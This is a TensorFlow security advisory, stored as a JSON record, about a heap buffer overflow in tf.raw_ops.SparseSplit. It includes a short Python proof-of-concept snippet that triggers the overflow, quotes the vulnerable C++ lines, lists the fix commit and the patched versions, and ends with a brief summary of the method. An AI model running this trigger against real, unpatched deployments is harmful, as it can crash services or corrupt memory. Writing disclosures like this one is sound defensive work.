{"description": "### Impact\nAn attacker can cause a heap buffer overflow in `tf.raw_ops.SparseSplit`:\n\n```python\nimport tensorflow as tf\n\nshape_dims = tf.constant(0, dtype=tf.int64)\nindices = tf.ones([1, 1], dtype=tf.int64)\nvalues = tf.ones([1], dtype=tf.int64)\nshape = tf.ones([1], dtype=tf.int64)\n\ntf.raw_ops.SparseSplit(\n    split_dim=shape_dims, indices=indices, values=values,\n    shape=shape, num_split=1)\n```\n\nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/699bff5d961f0abfde8fa3f876e6d241681fbef8/tensorflow/core/util/sparse/sparse_tensor.h#L528-L530) accesses an array element based on a user controlled offset:\n\n```cc\nconst int dim = input_tensor.indices().matrix<int64>()(i, split_dim);\nint slice_index = GetSliceIndex(dim, split_size, residual);\nnum_values[slice_index]++;\n```\n\nThis results in overriding values on the heap.\n\n### Patches\nWe have patched the issue in GitHub commit [8ba6fa29cd8bf9cef9b718dc31c78c73081f5b31](https://github.com/tensorflow/tensorflow/commit/8ba6fa29cd8bf9cef9b718dc31c78c73081f5b31).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.", "methods": ["Heap buffer overflow in `SparseSplit` function.", "User-controlled offset is used to access an array element on the heap.", "Values on the heap are overridden."]}
